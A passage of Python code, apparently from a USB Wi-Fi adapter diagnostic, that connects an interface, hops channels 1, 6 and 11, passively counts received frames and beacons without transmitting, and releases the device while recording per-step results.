            # Step 3: Bring up Interface
            try:
                ifaces = manager.wlan_ifaces()
                if not ifaces:
                    raise RuntimeError("No WLAN interfaces enumerated")
                iface = ifaces[0]
                ok = _safe_run(iface.connect(), timeout=20.0)
                if not ok:
                    raise RuntimeError("iface.connect() returned False")
                steps.append({"name": "Initialize chip & EEPROM", "ok": True, "detail": f"Connected {iface.name}"})
            except Exception as e:
                steps.append({"name": "Initialize chip & EEPROM", "ok": False, "detail": str(e)})
                return {"ok": False, "steps": steps, "error": str(e)}

            # Step 4: Channel Switch Test (1 -> 6 -> 11)
            try:
                for ch in (1, 6, 11):
                    _safe_run(iface.set_channel(ch, scan=True), timeout=5.0)
                steps.append({"name": "Channel hop (1 -> 6 -> 11)", "ok": True, "detail": "Radio PLL tuned successfully"})
            except Exception as e:
                steps.append({"name": "Channel hop (1 -> 6 -> 11)", "ok": False, "detail": str(e)})

            # Step 5: Passive RX diagnostic on CH 6 (zero packets transmitted)
            try:
                rx_stats = _safe_run(_passive_rx_probe(iface, channel=6, duration_s=1.2), timeout=5.0)
                steps.append({
                    "name": "Passive RX frames (CH 6, no TX)",
                    "ok": True,
                    "detail": (
                        f"bursts={rx_stats['rx_bursts']}, "
                        f"frames={rx_stats['raw_packets']}, "
                        f"beacons={rx_stats['beacons']}"
                    ),
                })
            except Exception as e:
                steps.append({"name": "Passive RX frames (CH 6, no TX)", "ok": False, "detail": str(e)})

            # Step 6: Clean Release
            try:
                _safe_run(iface.close(), timeout=5.0)
                iface = None
                libusb_fd.close_fd()
                steps.append({"name": "Release USB interface", "ok": True, "detail": "Interface detached cleanly"})
            except Exception as e:
                steps.append({"name": "Release USB interface", "ok": False, "detail": str(e)})

            all_ok = all(s["ok"] for s in steps)
            return {"ok": all_ok, "steps": steps, "error": None if all_ok else "One or more steps failed"}

        except BaseException as exc:
            return {"ok": False, "steps": steps, "error": str(exc), "traceback": traceback.format_exc()}
        finally:
            if iface is not None:
                try:
                    _safe_run(iface.close(), timeout=5.0)
                except Exception:
                    pass
            try:
                from . import libusb_fd
                libusb_fd.close_fd()
            except Exception:
                pass
